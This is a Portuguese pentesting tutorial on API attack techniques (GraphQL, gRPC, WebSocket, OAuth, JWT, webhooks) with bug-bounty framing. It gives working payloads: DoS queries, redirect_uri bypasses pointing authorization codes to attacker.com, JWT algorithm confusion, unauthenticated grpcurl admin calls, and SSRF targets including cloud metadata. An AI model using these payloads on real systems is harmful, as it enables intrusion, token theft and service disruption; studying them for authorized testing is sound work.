# 🔥 TÉCNICAS AVANÇADAS EM APIS - GraphQL, gRPC, WebSocket, OAuth

Vulnerabilidades complexas em arquiteturas modernas

---

# GraphQL EXPLOITATION

## O QUE É?

```
GraphQL = Query Language para APIs

Diferente de REST:
- REST: GET /api/users/123 retorna usuário completo
- GraphQL: Query seletor retorna APENAS o que pede
```

## VULNERABILIDADE 1: INTROSPECTION ENABLED

### Explicação

```
GraphQL pode expor toda sua estrutura via introspection:

query {
  __schema {
    types {
      name
      fields {
        name
        type
      }
    }
  }
}

Retorna:
- Todos os tipos de dados
- Todos os campos
- Todas as queries/mutations
- Que campos precisam autenticação
```

### TESTE COM BURP

```
POST /graphql
Content-Type: application/json

{
  "query": "{ __schema { types { name fields { name } } } }"
}

Se retorna schema = INTROSPECTION ENABLED (vulnerável!)

Extrair informações:
- Descobrir campos "admin" ou "private"
- Descobrir queries secretas
- Descobrir mutations perigosas
```

### BURP PASSO-A-PASSO

```
1. Intercepte POST /graphql
2. Envie para Repeater
3. Cole introspection query
4. [Send]
5. Analise resposta (pode ser gigante!)
6. Procure por:
   - admin, internal, private (nomes sensíveis)
   - mutation deleteUser, mutation updateRole
   - field password, secretKey
```

## VULNERABILIDADE 2: N+1 QUERY ATTACK

### Explicação

```
Query que retorna muitos dados:

query {
  users {
    id
    name
    posts {
      id
      title
      comments {
        id
        text
      }
    }
  }
}

Para 1000 users:
- 1 query: buscar users
- 1000 queries: buscar posts de cada user
- 10000 queries: buscar comments de cada post

= 11.001 queries! DENEGAÇÃO DE SERVIÇO!
```

### TESTE

```
POST /graphql
{
  "query": "{
    users {
      posts {
        comments {
          author {
            friends {
              posts {
                comments {
                  author {
                    friends
                  }
                }
              }
            }
          }
        }
      }
    }
  }"
}

Se completa = VULNERÁVEL a N+1!
Se demora muito = DoS possível!
```

## VULNERABILIDADE 3: QUERY COMPLEXITY ATTACK

### Explicação

```
Recursão infinita:

query {
  user {
    friends {
      friends {
        friends {
          friends {
            # ... repetir infinitamente
          }
        }
      }
    }
  }
}

Trava o servidor!
```

### PAYLOAD

```
Aliasing Attack:

query {
  a: user { id }
  b: user { id }
  c: user { id }
  d: user { id }
  ... (repetir 1000x)
}

Multiple queries mesmo resultado = DoS!
```

## VULNERABILIDADE 4: AUTHENTICATION BYPASS

### Payloads

```
Remover token:

mutation {
  login(username: "admin", password: "test") {
    token
  }
}

Usar token nulo:
Authorization: Bearer null
Authorization: Bearer ""
Authorization: Bearer undefined

Mudar tipo:
Query sem mutation protection
```

---

# gRPC EXPLOITATION

## O QUE É?

```
gRPC = Google Remote Procedure Call
- Usa Protocol Buffers (binário)
- HTTP/2
- Muito mais rápido que REST
- Menos documentado = mais vulnerável!
```

## VULNERABILIDADE 1: REFLECTION ENABLED

### Exploração

```
gRPC Reflection expõe serviços:

grpcurl list localhost:50051

Retorna:
- Todos os serviços
- Todos os métodos
- Estrutura de mensagens

Exemplo:
grpcurl -plaintext describe localhost:50051.UserService

Mostra:
- GetUser(UserRequest) -> UserResponse
- UpdateUser(UserRequest) -> UserResponse
```

### COM BURP

```
1. Use grpcurl para descobrir serviços
2. Use grpcurl para chamar métodos
3. Intercepte em Burp (se usar HTTP/2)
4. Teste permissões

grpcurl -plaintext \
  -d '{"user_id": 123}' \
  localhost:50051 UserService/GetUser

Se consegue acessar user_id 124 = VULNERÁVEL!
```

## VULNERABILIDADE 2: UNENCRYPTED TRAFFIC

```
gRPC sem TLS:
- Dados em plaintext
- Sem confidencialidade
- Sem autenticidade

Teste:
1. tcpdump em porta gRPC
2. Ver dados em plaintext
3. Modificar requests no Burp

Impacto: Roubo de dados, MITM
```

## VULNERABILIDADE 3: MISSING AUTHENTICATION

```
gRPC sem auth:
- Métodos acessíveis sem token
- Sem validação de permissões

Teste:
grpcurl localhost:50051 AdminService/DeleteUser

Se aceita sem autenticação = CRÍTICO!
```

---

# WEBSOCKET EXPLOITATION

## O QUE É?

```
WebSocket = Comunicação bidirecional em tempo real

Diferente de HTTP:
- Conexão persistente
- Cliente pode enviar quando quer
- Servidor pode enviar quando quer
```

## VULNERABILIDADE 1: UNVALIDATED MESSAGE

### Exploração

```
Cliente envia:
{
  "action": "send_message",
  "to_user": 123,
  "message": "Hello"
}

Servidor não valida:
- Permissão de enviar para user 123?
- Permissão de ação "send_message"?

Mudança para admin:
{
  "action": "delete_user",
  "user_id": 1
}

Se aceita = VULNERÁVEL!
```

### TESTE COM BURP

```
1. Abra WebSocket em Burp
2. Conecte ao endpoint WebSocket
3. Intercepte mensagens
4. Modifique JSON
5. Envie para servidor

Procure por:
- Permissões não validadas
- Ações não autorizadas
- Dados sensíveis em mensagens
```

## VULNERABILIDADE 2: CSRF EM WEBSOCKET

```
WebSocket sem proteção CSRF:

Atacante pode:
1. Criar página com script
2. Conectar ao WebSocket da vítima
3. Enviar mensagens como vítima

Mitigação:
- Validar Origin header
- Usar CSRF token
```

## VULNERABILIDADE 3: XSS VIA WEBSOCKET

```
Mensagem recebida renderizada no DOM:

ws.onmessage = (event) => {
  document.getElementById('chat').innerHTML = event.data;  // ❌ XSS!
}

Servidor envia:
<script>alert('XSS')</script>

Executa em cliente!
```

---

# OAUTH 2.0 BYPASS

## VULNERABILIDADE 1: REDIRECT_URI VALIDATION

### Exploração

```
OAuth flow:

1. Redireciona para: https://oauth.google.com/auth?redirect_uri=https://app.com/callback
2. Usuário autoriza
3. Google redireciona para: https://app.com/callback?code=xxx
4. App troca code por token

Bypass:
- redirect_uri=https://attacker.com/callback
- redirect_uri=https://app.com.attacker.com
- redirect_uri=https://app.com@attacker.com
- redirect_uri=http://app.com (HTTP ao invés de HTTPS)

Se aceita = code enviado para attacker!
```

### TESTE

```
1. Capture requisição de OAuth
2. Mude redirect_uri para attacker.com
3. Se autorização continua = VULNERÁVEL!
4. Attacker recebe code
5. Code pode ser trocado por token
```

## VULNERABILIDADE 2: MISSING STATE PARAMETER

```
OAuth sem state:

Normal:
1. Gera random state
2. Armazena em session
3. Redireciona com state
4. Verifica state na volta

Vulnerável:
- Sem state
- CSRF possível!

Exploit:
<img src="https://oauth.google.com/auth?redirect_uri=https://attacker.com">
Vítima autoriza sem saber
```

## VULNERABILIDADE 3: TOKEN REUSE

```
Token OAuth reutilizável:

1. Usuário faz login (autoriza)
2. Recebe token
3. Token nunca expira
4. Attacker pode reusar mesmo token

Teste:
1. Capture token
2. Use novamente depois
3. Se funciona = VULNERÁVEL!
```

---

# JWT EXPLOITATION EM APIS

## VULNERABILIDADE: ALGORITHM CONFUSION

### Exploração

```
API usa RS256 (RSA):

Header: {"alg":"RS256"}

Attacker muda para HS256:

Header: {"alg":"HS256"}
Payload: {"id":1,"is_admin":true}

Usa public key como secret:
signature = HMACSHA256(header.payload, public_key)

Se server aceita = VULNERÁVEL!
Porque confunde assimétrico com simétrico
```

### TESTE COM BURP

```
1. Capture JWT token
2. Copie header
3. Decoder → Base64 decode
4. Mude "alg":"RS256" para "alg":"HS256"
5. Mude "is_admin":false para "is_admin":true
6. Encode novamente
7. Calcule novo HMAC com public key
8. Envie no Repeater

Se aceita = Algorithm confusion!
```

---

# WEBHOOK EXPLOITATION

## VULNERABILIDADE 1: SSRF

### Exploração

```
Webhook pode acessar qualquer URL:

POST /webhooks/register
{
  "url": "http://localhost:8080/admin"
}

Servidor chama webhook:
POST http://localhost:8080/admin

Attacker consegue:
- Acessar localhost
- Explorar serviços internos
- Port scanning
```

### TESTE

```
1. Registre webhook com URL maliciosa
2. Dispare evento
3. Veja se acessa sua URL

Payloads:
- http://localhost:8080
- http://127.0.0.1:8080
- http://169.254.169.254 (AWS metadata)
- http://internal-service.local
```

## VULNERABILIDADE 2: TIMING ATTACK

```
Webhook sem verificação:

1. Registre webhook
2. Dispare evento rapidamente
3. Webhook demora para processar
4. Timing do lado do attacker

Usar para:
- Descobrir se arquivo existe
- Descobrir senhas (timing diferente para certa/errada)
```

---

## 📊 RESUMO TÉCNICAS AVANÇADAS

| Técnica | CVSS | Recompensa | Dificuldade |
|---|---|---|---|
| GraphQL Introspection | 7.5 | $500-2K | Fácil |
| GraphQL N+1 | 7.5 | $500-2K | Fácil |
| gRPC Reflection | 8.5 | $2K-5K | Médio |
| WebSocket CSRF | 7.0 | $500-2K | Médio |
| OAuth Bypass | 9.2 | $5K-15K | Difícil |
| JWT Algorithm | 8.8 | $2K-10K | Médio |
| Webhook SSRF | 9.0 | $2K-10K | Médio |

---

**Próximo:** Volte para [API-SECURITY-MASTER-README.md](./API-SECURITY-MASTER-README.md)

